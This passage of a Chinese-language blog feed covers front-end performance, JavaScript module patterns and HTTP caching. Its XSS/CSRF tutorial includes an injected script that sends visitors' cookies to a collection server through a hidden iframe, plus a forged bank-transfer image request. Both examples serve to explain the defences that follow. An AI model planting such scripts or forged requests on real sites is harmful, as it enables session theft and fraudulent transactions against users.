class="headerlink" title="2. 减轻HTTP请求数据大小"></a>2. 减轻HTTP请求数据大小</h3></li><li><p>css、script、图片压缩：这些可以gulp或者webpack自动化脚本里面定义脚本任务来完成。</p></li><li><p>服务器开启gzip压缩：一般现在服务器都有开启Gzip压缩，压缩率通常都是30%以上，效果还是不错的。</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/4869616-36154be394a65dfd.jpg?imageMogr2/auto-orient/strip&quot; alt=&quot;性能优化思考维度.jpg&quot;&gt;&lt;/p
      
    
    </summary>
    
      <category term="前端性能" scheme="http://yoursite.com/categories/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD/"/>
    
    
      <category term="前端性能" scheme="http://yoursite.com/tags/%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>前端模块化（一）</title>
    <link href="http://yoursite.com/2017/09/19/%E5%89%8D%E7%AB%AF%E6%A8%A1%E5%9D%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2017/09/19/前端模块化（一）/</id>
    <published>2017-09-19T01:18:36.000Z</published>
    <updated>2017-09-19T01:18:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实作为一个秋招狗，前端还没写够一年就来大谈特谈这些历史性问题，的确是不够格的，但是这又是学习前端学习者无法避免的一个问题，加上面试提问颇多，于是来总结一二。</p><blockquote><p>站在巨人的肩膀上。<br>参考资料：<br><a href="http://www.ruanyifeng.com/blog/2012/10/javascript_module.html" target="_blank" rel="noopener">Javascript模块化编程（一）：模块的写法</a><br><a href="http://web.jobbole.com/83761/" target="_blank" rel="noopener">Javascript模块化历程</a></p></blockquote><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>模块就是实现特定功能的一组方法。</p><p>最开始笔者学习js的时候，新建一个js文件，直接在里面写逻辑代码，然后script标签引入即可，一两个小网页是无妨的，但是随后后面逻辑越来越复杂，代码量越来越大，可复用的要求越来越多，笔者也是看着越来越混乱的js文件焦灼无比。</p><p>毕竟js最初只是作为一门“玩具语言”闯进开发者的视野，甚至这门语言仅仅花了不到一个月的时间就被创造了出来，我们如今看见的js，是开发者与互联网不断的磨合妥协下的js.</p><p>所以开发者不得不使用软件工程的方法，管理网页的业务逻辑。</p><p>但是，Javascript不是一种模块化编程语言，它不支持”类”（class），更遑论”模块”（module）了。（正在制定中的ECMAScript标准第六版，将正式支持”类”和”模块”，但还需要一段时间才能投入实用。）</p><p>“Don`t repeat yourself”是我们的准则，如何更好的去实践这条准则就是我们今天要讲的内容。</p><h2 id="函数封装"><a href="#函数封装" class="headerlink" title="函数封装"></a>函数封装</h2><p>直接在页面中写逻辑代码是我最初的做法，后来慢慢地学会了将重复的代码封装至一个函数之内，需要时调用函数即可。函数一个功能就是实现特定逻辑的一组语句打包，而且JavaScript的作用域就是基于函数的，所以把函数作为模块化的第一步是很自然的事情。</p><p>只要把不同的函数（以及记录状态的变量）简单地放在一起，就算是一个模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    statement</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    statement</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在需要的以后加载函数所在文件，调用函数就可以了。</p><p>这种做法的缺点很明显：污染了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间没什么关系。</p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>我们需要一个方法将全局变量减少，于是对象写法很自然的就出现了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myModule = &#123;</span><br><span class="line">    fn1: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        statement</span><br><span class="line">    &#125;,</span><br><span class="line">    fn2: <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">       statement</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>世界美好了那么一点点。</p><p>这样我们在希望调用模块的时候引用对应文件，然后</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myModule.fn1();</span><br></pre></td></tr></table></figure><p>但是我们看看下面这段代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myModule = &#123;</span><br><span class="line">    var1: <span class="number">1</span>,</span><br><span class="line">    var2: <span class="number">2</span>,</span><br><span class="line">    fn1: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;,</span><br><span class="line">    fn2: <span class="function"><span class="keyword">function</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">        var2 = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不知道大家发现没有，我明明可以直接通过</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myModule.var1;</span><br></pre></td></tr></table></figure><p>直接获取var1，那我还要调用fn1去return干嘛，简直奇怪。</p><p>没错，看似不错的解决方案，但是也有缺陷，这样的写法会暴露所有模块成员，内部状态可以被外部改写，毫无封装型可言。</p><p>在别的语言中可以很轻易的实现私有变量，例如java的private关键字，但是js需要通过别的手段来实现。</p><p>我们希望外部不能够如此随意的访问或者修改某一个变量，只能通过我们规定的特权方法去访问模块的变量，而无法直接改写内部状态，于是有了闭包。</p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>没错，闭包又出现了，当初学习闭包的时候，网上的种种文章，描述了闭包的定义，闭包的特点，以及如何实现闭包，但是，他们就是没有告诉你闭包主要是拿来做什么的，在我看来，闭包就是模块化的基础！</p><p>前面我们提到过JavaScript的作用域就是基于函数的，我们可以通过这一点将想要隐藏起来的变量置于函数作用域中，根据作用域链访问的原则，外层是无法访问到该变量的，</p><p>看下面代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　<span class="keyword">var</span> var1 = <span class="number">0</span>;</span><br><span class="line">　　　　<span class="keyword">var</span> fn1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　　　<span class="keyword">var</span> fn2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　<span class="comment">//...</span></span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　　　<span class="keyword">return</span> &#123;</span><br><span class="line">　　　　　　fn1 : fn1,</span><br><span class="line">　　　　　　fn2 : fn2</span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　&#125;)();</span><br></pre></td></tr></table></figure></p><p>这里是一个立即执行函数，return一个对象，该对象内部的函数是可以直接访问到var1的（闭包），而外部再也不能轻易的去访问var1了，只能通过module1的方法去访问，世界又美好了一点。</p><p>PS：我一直觉得立即执行函数的本质就只是为了立即执行而已，不理解为什么还特地产生了一个概念，如果您有更好的解答，请写下您的评论。</p><p>module1就是Javascript模块的基本写法。</p><p>当然还有类似于jq的那种写法，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span> (<span class="params">$, YAHOO</span>) </span>&#123;</span><br><span class="line">　　　　<span class="comment">//...</span></span><br><span class="line">　　&#125;)(jQuery, YAHOO);</span><br></pre></td></tr></table></figure><p>独立性是模块的重要特点，模块内部最好不与程序的其他部分直接交互。</p><p>为了在模块内部调用全局变量，必须显式地将其他变量输入模块。</p><p>输入全局变量，这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显。</p><p>看懂了上面的，这一个应当很容易理解。</p><p>下集预告：AMD/CMD/Commonjs/ES6</p><p>最近一直在总结校招重点，而那些重点基本是搜集别人的文章里面的，发在简书上未免有拿别人的文章骗赞之嫌。</p><p>所以有面试的小伙伴们可以去我的博客看看，相互交流，共同提升。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实作为一个秋招狗，前端还没写够一年就来大谈特谈这些历史性问题，的确是不够格的，但是这又是学习前端学习者无法避免的一个问题，加上面试提问颇多，于是来总结一二。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;站在巨人的肩膀上。&lt;br&gt;参考资料：&lt;br&gt;&lt;a href=&quot;http:/
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>前端安全：XSS与CSRF</title>
    <link href="http://yoursite.com/2017/09/15/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E4%B8%8ECSRF/"/>
    <id>http://yoursite.com/2017/09/15/前端安全：XSS与CSRF/</id>
    <published>2017-09-15T15:39:52.000Z</published>
    <updated>2017-09-15T15:39:52.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>整理自:<br><a href="http://www.zyy1217.com/2017/04/22/%E8%AF%A6%E8%A7%A3XSS%E4%B8%8ECSRF%E4%B8%A4%E7%A7%8D%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">详解XSS与CSRF两种跨站攻击</a><br><a href="https://segmentfault.com/a/1190000004623125" target="_blank" rel="noopener">总结 XSS 与 CSRF 两种跨站攻击</a></p></blockquote><h2 id="XSS跨站脚本（Cross-site-scripting，通常简称为XSS）"><a href="#XSS跨站脚本（Cross-site-scripting，通常简称为XSS）" class="headerlink" title="XSS跨站脚本（Cross-site scripting，通常简称为XSS）"></a>XSS跨站脚本（Cross-site scripting，通常简称为XSS）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p><h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><p>假设xx贴吧存在这个漏洞，我打开一个帖子回复：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用&lt;script type="text/javascript"&gt;&lt;/script&gt;包起来</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    alert(<span class="string">'hello,xss'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这条回复就发出去啦，当其他用户点进这个帖子，这段代码就会被执行，然后一直alert，这就是最原始的脚本注入。</p><p>那XSS跨站脚本也很容易理解了，注入一个可以跨站的脚本即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>这时候，用户点进帖子，这段代码开始运行，他们并不知道自己的信息（cookie）已经被iframe跨域的方式送到收集服务器上，然后我们就可以用cookie中的隐私信息做很多很多事情啦。</p><h3 id="如何防御XSS攻击"><a href="#如何防御XSS攻击" class="headerlink" title="如何防御XSS攻击"></a>如何防御XSS攻击</h3><p>我们知道AJAX技术所使用的XMLHttpRequest对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用iframe也一样可以达到相同的目的。甚至在愿意的情况下，我还能用iframe发起POST请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止XSS的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。</p><p>正如上文所说，如果我们不需要用户输入HTML而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。</p><h2 id="CSRF跨站请求伪造（ross-site-request-forgery）"><a href="#CSRF跨站请求伪造（ross-site-request-forgery）" class="headerlink" title="CSRF跨站请求伪造（ross-site request forgery）"></a>CSRF跨站请求伪造（ross-site request forgery）</h2><p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p>你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p><p>严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过XSS来实现CSRF易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><img src="http://upload-images.jianshu.io/upload_images/4869616-3449f27f48a1a9c5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="csrf.jpg"></p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><ol><li>登录受信任网站A，并在本地生成Cookie。</li><li>在不登出A的情况下，访问危险网站B。</li></ol><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ol><li>你登录银行网站A，银行网站A违反了HTTP规范，使用GET请求更新资源。这就存在了csrf漏洞。</li><li><p>你访问危险网站B，B中有一段代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http:<span class="comment">//www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>你发现你的账户少了1000元</p></li></ol><p>为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="noopener">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a> ，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p><h3 id="如何防御CSRF攻击"><a href="#如何防御CSRF攻击" class="headerlink" title="如何防御CSRF攻击"></a>如何防御CSRF攻击</h3><ol><li><p>通过 referer 判定来源页面<br> referer是在HTTP Request Head里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer任何值。当然这个做法并不是毫无作用，起码可以防小白。</p></li><li><p>使用验证码<br> 在表单中增加一个随机的数字或字母验证码，通过强制用户和应用进行交互，来有效地遏制CSRF攻击。</p></li><li><p>token验证</p><ul><li><p>在 HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有token或者token内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p></li><li><p>token需要足够随机</p></li><li><p>敏感的操作应该使用POST，而不是GET，以form表单的形式提交，可以避免token泄露。</p></li></ul></li><li><p>在 HTTP 头中自定义属性并验证<br> 这种方法也是使用 token 并进行验证，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过 XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。</p><p> 我的理解：WebB并没有获取你的cookie，而只是伪造用户发起http请求，浏览器自动带上cookie而已，token存放在cookie中，即使cookie发送至服务端，我们每一次接受请求验证的并不是cookie，而是header中的token，WebB就无能为力了。</p></li></ol><h2 id="XSS与CSRF的区别"><a href="#XSS与CSRF的区别" class="headerlink" title="XSS与CSRF的区别"></a>XSS与CSRF的区别</h2><p>CSRF 和 XSS 根本是两个不同维度上的分类。XSS是实现CSRF的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。</p><p>可以通过跨站脚本注入XSS获取用户的信息，获得用户信息过后可以做诸多的事情，但是CSRF只能模拟用户行为，</p><p>CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在cookie里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;整理自:&lt;br&gt;&lt;a href=&quot;http://www.zyy1217.com/2017/04/22/%E8%AF%A6%E8%A7%A3XSS%E4%B8%8ECSRF%E4%B8%A4%E7%A7%8D%E8%B7%A8%E7%AB%99%E6
      
    
    </summary>
    
      <category term="http" scheme="http://yoursite.com/categories/http/"/>
    
    
      <category term="http" scheme="http://yoursite.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>HTTP中的缓存机制</title>
    <link href="http://yoursite.com/2017/09/14/HTTP%E4%B9%8B%E7%BC%93%E5%AD%98/"/>
    <id>http://yoursite.com/2017/09/14/HTTP之缓存/</id>
    <published>2017-09-14T05:05:24.000Z</published>
    <updated>2017-09-14T05:05:24.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/4869616-57732386f1ec1dea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http缓存机制.png"></p><p>图：一个缓存GET请求的具体流程（源于《http权威指南》）</p><p>总的来说，客户端从服务器请求数据经历如下基本步骤:</p><ol><li>检查是否已缓存：如果请求命中本地缓存则从本地缓存中获取一个对应资源的副本；</li><li>检查这个资源是否新鲜：是则直接返回到客户端，否则继续向服务器转发请求，进行再验证。</li><li>再验证阶段：服务器接收到请求，然后再验证判断资源是否相同，是则返回304 not modified，未变更。 否则返回新内容和200状态码。</li><li>客户端更新本地缓存。</li></ol><h2 id="Stage1-检查缓存"><a href="#Stage1-检查缓存" class="headerlink" title="Stage1: 检查缓存"></a>Stage1: 检查缓存</h2><ol><li>缓存不存在，直接向服务器发出请求，状态码200</li><li>缓存存在，进入Stage2</li></ol><h2 id="Stage2-检查资源是否新鲜"><a href="#Stage2-检查资源是否新鲜" class="headerlink" title="Stage2: 检查资源是否新鲜"></a>Stage2: 检查资源是否新鲜</h2><p>关键字：过期检测、Expires策略、Cache-control策略（重点）</p><ol><li>缓存资源未过期，使用缓存，状态码200 from cache</li><li>缓存资源过期，进入Stage3</li></ol><h3 id="过期检测"><a href="#过期检测" class="headerlink" title="过期检测"></a>过期检测</h3><p>服务器用HTTP1.0中使用 Expires 首部或HTTP1.1中的 Cache-Control:max-age响应首部来指定过期时间。两者同时设置时，在HTTP1.1服务器中，Cache-Control 的优先级高于 Expires</p><h3 id="Expires策略"><a href="#Expires策略" class="headerlink" title="Expires策略"></a>Expires策略</h3><p>Expires是Web服务器响应消息头字段，在响应http请求时告诉浏览器在过期时间前浏览器可以直接从浏览器缓存取数据，而无需再次请求。</p><p>不过Expires是HTTP1.0的东西，现在默认浏览器均默认使用HTTP1.1，所以它的作用基本忽略。</p><h3 id="Cache-control策略（重点）"><a href="#Cache-control策略（重点）" class="headerlink" title="Cache-control策略（重点）"></a>Cache-control策略（重点）</h3><p>Cache-Control与Expires的作用一致，都是指明当前资源的有效期，控制浏览器是否直接从浏览器缓存取数据还是重新发请求到服务器取数据。这个协定取代了以前的 Expires 指令，在 HTTP/1.1 开始支持，且如果同时设置的话，优先级高于Expires。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control" target="_blank" rel="noopener">Cache-control详解-MDN</a></p><p>如果 Expires 或 Cache-Control:max-age验证未过期，即资源是新鲜的。则直接返回200状态码，使用缓存。这里注意缓存命中和访问原始服务器的响应码都是200，有些代理缓存会在via首部附加额外信息，或者使用 200(from cache)。 对于未明确标识的，可以使用Date首部的值和当前时间进行比较，如果响应中的日期比较早，客户端通常可以认为这是一条缓存的响应。</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-a3444aa33f0392e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http缓存机制2.png"></p><p>金字塔最下端即缓存资源未过期，使用缓存，状态码200 from cache。</p><p>如果缓存资源过期了进入Stage3</p><h2 id="Stage3-服务器再验证"><a href="#Stage3-服务器再验证" class="headerlink" title="Stage3: 服务器再验证"></a>Stage3: 服务器再验证</h2><p>关键字：If-None-Match /Etag、If-Modified-Since／Last-Modified</p><ol><li>资源没有变化，直接返回响应304和一个空的响应体。</li><li>资源发生了变化，返回新的资源 状态码200</li></ol><h3 id="If-None-Match-Etag"><a href="#If-None-Match-Etag" class="headerlink" title="If-None-Match /Etag"></a>If-None-Match /Etag</h3><p>HTTP协议规格引入ETag（被请求变量的实体标记），简单点即服务器响应时给请求URL标记，并在HTTP响应头中将其传送到客户端，类似服务器端返回的格式：</p><ul><li><p>Etag：web服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</p></li><li><p>If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etag声明，则再次向web服务器请求时带上头If-None-Match（Etag的值）。web服务器收到请求后发现有头If-None-Match则与被请求资源的相应校验串进行比对，决定返回200或304。<br>在客户端第一次发出请求后，HttpReponse Header中包含Etag</p></li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Etag:</span>“<span class="number">5</span><span class="string">d8c72a5edda8d6a:</span><span class="number">3239</span>″</span><br></pre></td></tr></table></figure><p>等于告诉Client端，你拿到的这个的资源有表示ID：5d8c72a5edda8d6a:3239</p><p>当客户端下一次请求资源过期时，发现资源具有Etag声明，浏览器同时发出一个If-None-Match报头(Http RequestHeader)此时包头中信息包含上次访问得到的Etag:“5d8c72a5edda8d6a:3239″标识。</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">If</span>-<span class="keyword">None</span>-Match:“d8c72a5edda8d6a:<span class="number">3239</span>“</span><br></pre></td></tr></table></figure><p>这样，服务器端就会比对2者的Etag。如果匹配，则返回304(Not Modified) Response。如果不在匹配，则请求一个新的对象。</p><h3 id="If-Modified-Since／Last-Modified"><a href="#If-Modified-Since／Last-Modified" class="headerlink" title="If-Modified-Since／Last-Modified"></a>If-Modified-Since／Last-Modified</h3><p>在浏览器第一次请求某一个URL时，服务器端的返回状态会是 200 ，内容是你请求的资源，同时有一个Last-Modified的属性标记(HttpReponse Header)此文件在服务期端最后被修改的时间，<br>格式类似这样：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Last-Modified</span><span class="selector-pseudo">:Tue</span>, 24 <span class="selector-tag">Feb</span> 2009 08<span class="selector-pseudo">:01</span><span class="selector-pseudo">:04</span> <span class="selector-tag">GMT</span></span><br></pre></td></tr></table></figure><p>客户端第二次请求此URL时，首先会判断是否有缓存以及缓存是否过期，如果缓存过期，浏览器会向服务器传送条件GET请求，包含 If-Modified-Since报头(HttpRequest Header)，询问该时间之后文件是否有被修改过：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">If-Modified-Since</span><span class="selector-pseudo">:Tue</span>, 24 <span class="selector-tag">Feb</span> 2009 08<span class="selector-pseudo">:01</span><span class="selector-pseudo">:04</span> <span class="selector-tag">GMT</span></span><br></pre></td></tr></table></figure><p>web服务器收到请求后发现有头If-Modified-Since则与被请求资源在客户端的最后修改时间 Last-Modified 进行比对。若最后修改时间较新，说明资源又被改动过，则响应整片资源内容（写在响应消息包体内），响应状态码为 HTTP 200；若最后修改时间 Last-Modified较旧，说明资源无新修改，则 响应HTTP 304 (这里只需要发送一个head头，包体内容为空，这样就节省了传输数据量)，告知浏览器继续使用所保存的cache。</p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-b2ec0326e3e76b51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="if-modify.png"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="Etag和Last-Modified"><a href="#Etag和Last-Modified" class="headerlink" 